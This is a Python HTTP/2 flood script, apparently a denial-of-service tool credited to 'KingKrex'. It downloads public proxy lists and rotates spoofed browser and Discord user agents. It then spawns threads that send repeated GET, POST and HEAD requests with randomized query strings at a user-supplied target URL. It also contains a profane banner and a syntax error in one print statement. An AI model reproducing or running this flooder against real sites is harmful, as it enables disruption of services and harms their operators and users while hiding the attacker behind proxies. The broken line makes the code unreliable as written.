import os
try:
    import requests
except:
    os.system('pip install requests')
    import requests
# -----------------------------------------------
try:
    from pystyle import *
except:
    os.system('pip install pystyle')
    from pystyle import *
# -----------------------------------------------
try:
    import httpx
except:
    os.system('pip install httpx')
    os.system('pip install httpx[http2]')
    os.system('pip install httpx[socks]')

    import httpx
# -----------------------------------------------
import threading
import random
# -----------------------------------------------
os.system('title  HTTP/2 Flood by KingKrex#4235')
os.system('color')
os.system('cls')
# -----------------------------------------------

System.Size(75, 40)
Cursor.HideCursor()

fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))
color = Col.StaticMIX((Col.purple, Col.blue))

def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f"{Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

banner = r"""

  satu kata  "kontol"


""".replace('▓', '▀')

print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))


# -----------------------------------------------
try:
    
    http = requests.get('https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt').text # HTTP
    https = requests.get('https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt').text # HTTPS
    socks4 = requests.get('https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt').text # Socks4
    socks5 = requests.get('https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt').text # Socks5
    proxies = requests.get('https://sheesh.rip/all').text # Mixed

except:
    os.system('cls')
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
    print(stage("Failed to Get Proxy List\n"))
    os.system('pause')
    exit()

# -----------------------------------------------

try:
    with open('proxies.txt', 'w') as f:
        f.write(http)
        f.write(https)
        f.write(socks4)
        f.write(socks5)
        f.write(proxies)

    del http
    del https
    del socks4
    del socks5
    del proxies
    
    del f
    
except:
    os.system('cls')
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
    print(stage("Failed to Modify Proxy List!\n"))
    os.system('pause')
    exit()

# -----------------------------------------------

agents = [
            # Standard User Agents
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
            "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
            "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
            
            # Discord User Agents
            "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com) (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com) (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0",
            "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com) (iPhone; CPU iPhone OS 14_5 like Mac OS X)",
            "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
            "Mozilla/5.0 (compatible; Discordbot/1.0; +https://discordapp.com)",
            "Discord-Interactions/1.0 (+https://discord.com)",
            "Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0"  
]

# -----------------------------------------------

site = input(str(stage(f"Target URL {purple}->{fluo2} ", '?')))
print()
Threads = int(input(stage(f"Threads {purple}[{white}Press {fluo2}Enter{white} For 250{purple}]{purple}->{fluo2} ", '?')))
print()
def flood():

    proxies = open('proxies.txt', 'r')
    proxy = random.choice(list(proxies))
    proxies = {'http://': 'socks5://' + proxy}

    headers = {
            'Connection': 'Keep-Alive',
            'user-agent': random.choice(agents), 
            'Upgrade-Insecure-Requests': '1', 
            'Accept-Encoding': 'gzip, deflate, br', 
            'Accept-Language': 'en-US,en;q=0.5', 
            'Cache-Control': 'no-cache', 
            'Pragma': 'no-cache', 
            'Connection': 'Keep-Alive', 
            'X-Requested-With': 'XMLHttpRequest'
        }

    with httpx.Client(http2=True, headers=headers, proxies=proxies) as client:
        try:
            abc = site + "?=" + str(random.randint(1, 1000)) + "=" + str(random.randint(1, 1000))
            r = client.get(abc)
            r = client.post(abc)
            r = client.head(abc)

            print({proxy}", end='\r')

        except:
            print("Dead Proxy.")

    for i in range(int(Threads)):
        threading.Thread(target=flood).start()

# -----------------------------------------------

if __name__ == '__main__':
    flood()
